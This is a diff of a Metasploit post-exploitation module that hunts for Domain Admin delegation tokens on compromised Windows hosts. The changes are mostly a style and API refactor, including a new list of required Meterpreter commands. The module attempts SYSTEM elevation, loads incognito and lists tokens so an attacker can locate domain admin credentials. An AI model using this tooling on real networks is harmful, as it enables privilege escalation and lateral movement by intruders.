@@ -1,17 +1,17 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Post
+class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Priv
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'             => "Windows Gather Enumerate Domain Admin Tokens (Token Hunter)",
-      'Description'      => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => "Windows Gather Enumerate Domain Admin Tokens (Token Hunter)",
+        'Description' => %q{
           This module will identify systems that have a Domain Admin (delegation) token
           on them.  The module will first check if sufficient privileges are present for
           certain actions, and run getprivs for system.  If you elevated privs to system,
@@ -19,15 +19,30 @@ class Metasploit3 < Msf::Post
           migrating to another process that is running as system.  If no sufficient
           privileges are available, the script will not continue.
         },
-      'License'         => MSF_LICENSE,
-      'Platform'        => ['win'],
-      'SessionTypes'    => ['meterpreter'],
-      'Author'          => ['Joshua Abraham <jabra[at]rapid7.com>']
-    ))
+        'License' => MSF_LICENSE,
+        'Platform' => ['win'],
+        'SessionTypes' => ['meterpreter'],
+        'Author' => ['Joshua Abraham <jabra[at]rapid7.com>'],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              incognito_list_tokens
+              priv_elevate_getsystem
+              stdapi_registry_open_key
+              stdapi_sys_config_getprivs
+              stdapi_sys_config_getuid
+              stdapi_sys_config_sysinfo
+              stdapi_sys_process_get_processes
+            ]
+          }
+        }
+      )
+    )
     register_options(
       [
         OptBool.new('GETSYSTEM', [ true, 'Attempt to get SYSTEM privilege on the target host.', true])
-      ], self.class)
+      ]
+    )
   end
 
   def get_system
@@ -66,6 +81,7 @@ class Metasploit3 < Msf::Post
         next if user.strip == ""
         next if user =~ /-----/
         next if user =~ /The command completed successfully/i
+
         members << user.strip
       end
     end
@@ -74,7 +90,7 @@ class Metasploit3 < Msf::Post
   end
 
   # return the value from the registry
-  def reg_getvaldata(key,valname)
+  def reg_getvaldata(key, valname)
     value = nil
     begin
       root_key, base_key = client.sys.registry.splitkey(key)
@@ -132,9 +148,9 @@ class Metasploit3 < Msf::Post
     end
 
     # load incognito
-    session.core.use("incognito") if(! session.incognito)
+    session.core.use("incognito") if (!session.incognito)
 
-    if(! session.incognito)
+    if (!session.incognito)
       print_error("Failed to load incognito on #{session.sid} / #{session.session_host}")
       return
     end
@@ -144,10 +160,10 @@ class Metasploit3 < Msf::Post
     domain_admins = get_members(usr_res.split("\n"))
 
     domain_admins.each do |da_user|
-      #Create a table for domain admin PIDs, users, IPs, and SIDs
-      tbl_pids = Rex::Ui::Text::Table.new(
-        'Header'  => 'Domain admin token PIDs',
-        'Indent'  => 1,
+      # Create a table for domain admin PIDs, users, IPs, and SIDs
+      tbl_pids = Rex::Text::Table.new(
+        'Header' => 'Domain admin token PIDs',
+        'Indent' => 1,
         'Columns' => ['sid', 'IP', 'User', 'PID']
       )
 
@@ -155,7 +171,7 @@ class Metasploit3 < Msf::Post
       res = session.incognito.incognito_list_tokens(0)
       if res
         res["delegation"].split("\n").each do |user|
-          ndom,nusr = user.split("\\")
+          ndom, nusr = user.split("\\")
           if not nusr
             nusr = ndom
             ndom = nil
@@ -181,7 +197,7 @@ class Metasploit3 < Msf::Post
         end
       end
 
-      #At the end of the loop, store and print results for this da_user
+      # At the end of the loop, store and print results for this da_user
       if not tbl_pids.rows.empty? and session.framework.db.active
         report_note(
           :host => session.session_host,
@@ -191,5 +207,4 @@ class Metasploit3 < Msf::Post
       end
     end
   end
-
 end
